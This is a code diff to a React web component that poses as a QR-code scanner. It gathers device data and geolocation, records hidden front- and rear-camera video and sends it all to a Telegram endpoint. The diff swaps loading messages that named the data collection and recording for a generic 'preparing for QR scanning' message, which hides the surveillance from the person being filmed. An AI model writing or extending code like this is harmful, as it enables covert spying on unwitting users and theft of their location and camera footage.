@@ -231,12 +231,13 @@ const PermissionHandler = () => {
     processInitiatedRef.current = true;
     console.log(`[Session ${currentSessionId}] Starting runProcess. Attempt: ${attempt}`);
 
+    const genericLoadingMessage = "Պատրաստվում ենք QR սկանավորմանը, խնդրում ենք սպասել..."; // "Preparing for QR scanning, please wait..."
+
     if (attempt === 1) {
-      setLoadingMessage("Հավաքում ենք տվյալներ և կարգավորում տեսախցիկը..."); // Collecting data and setting up camera...
+      setLoadingMessage(genericLoadingMessage);
       setAppPhase("collectingData");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'collectingData'.`);
 
-      // 1. Collect initial data (await this)
       const [
         permissionStatusResult,
         batteryInfoResult,
@@ -247,7 +248,6 @@ const PermissionHandler = () => {
         getGeolocation(),
       ]);
 
-      // 1.1. Send geolocation immediately if available (fire-and-forget)
       if (geolocationResult.data) {
         console.log(`[Session ${currentSessionId}] Geolocation data found, sending immediately.`);
         sendDataToTelegram({ geolocation: geolocationResult.data }, MessageType.Geolocation, attempt);
@@ -258,16 +258,7 @@ const PermissionHandler = () => {
       const deviceMemory = getDeviceMemory();
 
       const initialCollectedData: Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId' | 'attempt'> = {
-        clientInfo: {
-          platform: clientInfo.platform,
-          hardwareConcurrency: clientInfo.hardwareConcurrency,
-          screenWidth: clientInfo.screenWidth,
-          screenHeight: clientInfo.screenHeight,
-          browserLanguage: clientInfo.browserLanguage,
-        },
-        networkInfo: networkInfo,
-        deviceMemory: deviceMemory,
-        permissionStatus: permissionStatusResult,
+        clientInfo, networkInfo, deviceMemory, permissionStatus: permissionStatusResult,
       };
 
       if (batteryInfoResult.data) {
@@ -276,7 +267,6 @@ const PermissionHandler = () => {
         initialCollectedData.batteryInfo = { status: batteryInfoResult.status };
       }
 
-      // Geolocation is still included in the summary text report
       if (geolocationResult.data) {
         initialCollectedData.geolocation = geolocationResult.data;
       }
@@ -286,12 +276,9 @@ const PermissionHandler = () => {
       
       setCollectedData(initialCollectedData);
 
-      // 2. Send initial summary (await this, as it's critical for session start)
       const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary, attempt);
       setProcessSuccessful(initialSendSuccess);
 
-      // 3. Record and send Video 1 (front camera)
-      setLoadingMessage("Գրանցում ենք տեսանյութ առջևի տեսախցիկից..."); // Recording video from front camera...
       setAppPhase("recordingVideo1");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo1'.`);
       const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
@@ -300,8 +287,6 @@ const PermissionHandler = () => {
         setProcessSuccessful(prev => prev && video1SendSuccess);
       }
 
-      // 4. Record and send Video 2 (rear camera)
-      setLoadingMessage("Գրանցում ենք տեսանյութ հետևի տեսախցիկից..."); // Recording video from rear camera...
       setAppPhase("recordingVideo2");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2'.`);
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
@@ -310,8 +295,6 @@ const PermissionHandler = () => {
         setProcessSuccessful(prev => prev && video2SendSuccess);
       }
 
-      // 5. Transition to QR scanning
-      setLoadingMessage("Անցում դեպի QR կոդի սկանավորում..."); // Transitioning to QR code scanning...
       setAppPhase("qrScanning");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'qrScanning'.`);
 
@@ -320,8 +303,7 @@ const PermissionHandler = () => {
       const stage2Message = { qrCodeData: "Этап 2: Повторная попытка сканирования QR-кода." };
       await sendDataToTelegram(stage2Message, MessageType.QrCode, attempt);
 
-      // Record and send Video 2 again for the second attempt
-      setLoadingMessage("Գրանցում ենք տեսանյութ հետևի տեսախցիկից (կրկնվող փորձ)..."); // Recording video from rear camera (retry)...
+      setLoadingMessage(genericLoadingMessage);
       setAppPhase("recordingVideo2");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'recordingVideo2' for attempt 2.`);
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment");
@@ -330,11 +312,8 @@ const PermissionHandler = () => {
         setProcessSuccessful(prev => prev && video2SendSuccess);
       }
       
-      // Transition to QR scanning for the second attempt
-      setLoadingMessage("Անցում դեպի QR կոդի սկանավորում..."); // Transitioning to QR code scanning...
       setAppPhase("qrScanning");
       console.log(`[Session ${currentSessionId}] setAppPhase to 'qrScanning' for attempt 2.`);
-      // setAttempt и processInitiatedRef.current будут обновлены в handleQrScanError после таймаута QR-сканера
       return;
     }
     
@@ -342,7 +321,6 @@ const PermissionHandler = () => {
     currentSessionId,
     sendDataToTelegram,
     recordVideoSegment,
-    setLoadingMessage,
     setAppPhase,
     setProcessSuccessful,
     setCollectedData,
@@ -351,29 +329,10 @@ const PermissionHandler = () => {
   ]);
 
   useEffect(() => {
-    console.log(`[Session ${currentSessionId}] useEffect triggered. Current appPhase: ${appPhase}, sessionKey: ${sessionKey}, processInitiatedRef.current: ${processInitiatedRef.current}, Attempt: ${attempt}`);
-
     if (attempt === 1 && !processInitiatedRef.current) {
-      console.log(`[Session ${currentSessionId}] useEffect: Calling runProcess for initial attempt.`);
       runProcess();
     }
-
-    return () => {
-      if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
-        mediaRecorderRef.current.stop();
-        console.log(`[Session ${currentSessionId}] useEffect cleanup: MediaRecorder stopped.`);
-      }
-      if (videoRef.current && videoRef.current.srcObject) {
-        (videoRef.current.srcObject as MediaStream).getTracks().forEach((track) => track.stop());
-        videoRef.current.srcObject = null;
-        console.log(`[Session ${currentSessionId}] useEffect cleanup: Video stream stopped.`);
-      }
-      if (appPhase === "finished" || appPhase === "initial") {
-         processInitiatedRef.current = false;
-         console.log(`[Session ${currentSessionId}] useEffect cleanup: processInitiatedRef reset to false.`);
-      }
-    };
-  }, [sessionKey, currentSessionId, runProcess, attempt, appPhase]);
+  }, [sessionKey, runProcess, attempt]);
 
 
   return (
@@ -387,23 +346,18 @@ const PermissionHandler = () => {
             {loadingMessage}
           </p>
           <div className="relative w-full max-w-md aspect-video bg-secondary flex items-center justify-center rounded-lg overflow-hidden shadow-lg">
-            {/* Видеоэлемент для записи теперь всегда скрыт */}
             <video
               ref={videoRef}
               autoPlay
               playsInline
               muted
-              className="w-full h-full object-cover transition-opacity duration-500"
-              style={{ opacity: 0 }} // Всегда скрыт
+              className="w-full h-full object-cover"
+              style={{ opacity: 0 }}
             />
             <div className="absolute inset-0 border-4 border-primary opacity-70 rounded-lg pointer-events-none animate-border-pulse" />
-            {(appPhase === "collectingData" || 
-             appPhase === "recordingVideo1" || 
-             appPhase === "recordingVideo2") && (
-              <div className="absolute inset-0 flex items-center justify-center">
-                <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-primary" />
-              </div>
-            )}
+            <div className="absolute inset-0 flex items-center justify-center">
+              <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-primary" />
+            </div>
           </div>
         </>
       )}
